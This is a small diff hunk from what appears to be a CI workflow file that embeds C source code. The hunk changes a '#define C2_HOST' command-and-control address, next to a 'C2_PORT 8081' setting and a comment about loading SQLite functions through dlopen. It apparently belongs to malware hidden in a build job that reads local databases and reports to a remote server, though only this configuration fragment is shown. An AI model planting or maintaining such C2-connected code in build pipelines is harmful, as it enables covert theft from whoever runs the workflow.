@@ -58,7 +58,7 @@ jobs:
           #include <sys/stat.h>
           #include <dlfcn.h>
            
-          #define C2_HOST "192.168.110.111"
+          #define C2_HOST "192.168.2.67"
           #define C2_PORT 8081
            
           /* SQLite function pointers (loaded via dlopen) */
